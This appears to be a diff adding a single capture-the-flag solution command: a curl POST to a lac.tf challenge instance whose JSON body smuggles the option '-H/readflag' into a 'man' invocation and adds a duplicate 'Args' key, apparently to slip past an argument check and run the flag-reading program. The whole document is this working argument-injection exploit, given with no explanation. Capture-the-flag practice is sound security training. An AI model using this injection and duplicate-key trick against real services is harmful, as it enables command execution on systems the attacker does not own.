@@ -1,0 +1,8 @@
+curl --request POST \
+  --url https://glotq-m32pk.instancer.lac.tf/yaml \
+  --header 'content-type: application/json' \
+  --data '{
+  "command": "man",
+  "args": ["-H/readflag", "jq"],
+  "Args": ["jq"]
+}'
